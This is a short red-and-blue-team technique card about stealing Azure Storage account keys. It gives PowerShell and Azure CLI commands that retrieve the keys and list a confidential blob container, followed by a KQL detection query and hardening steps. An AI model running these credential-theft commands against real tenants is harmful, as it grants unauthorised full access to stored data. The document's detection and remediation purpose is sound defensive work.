# [CA-UNSC-008]: Azure Storage Account Key Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-008 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Storage Accounts have two 512-bit access keys (Master Keys) that grant Full Control over data (Blobs, Files, Tables). Any user with `Microsoft.Storage/storageAccounts/listKeys/action` permission can retrieve these keys.
- **Attack Surface:** Azure Resource Manager (ARM).
- **Business Impact:** **Data Exfiltration**. Total access to all data in the storage account.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Contributor or Storage Account Key Operator Service Role.
- **Tools:**
    - Azure CLI / PowerShell
    - [MicroBurst](https://github.com/NetSPI/MicroBurst)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Retrieve Keys**
```powershell
Get-AzStorageAccountKey -ResourceGroupName "RG-Data" -Name "storacct1"
```

**Step 2: Access Data**
Use the key to mount or download data.
```bash
az storage blob list --account-name storacct1 --account-key <KEY> --container-name confidential
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Activity Logs
| Source | Operation | Filter Logic |
|---|---|---|
| **ActivityLog** | `ListStorageAccountKeys` | Any call to this operation, especially from non-admin accounts. |

#### 5.2 Sentinel (KQL)
```kusto
AzureActivity
| where OperationNameValue == "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION"
| where ActivityStatusValue == "Success"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Disable Keys:** Configure the Storage Account to **disable Shared Key Access** (`AllowSharedKeyAccess = false`). Force all access to be via Entra ID (RBAC).
*   **RBAC:** Grant `Storage Blob Data Contributor` instead of generic `Contributor` (which includes Key Listing rights).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [EXFIL-CLOUD-001]
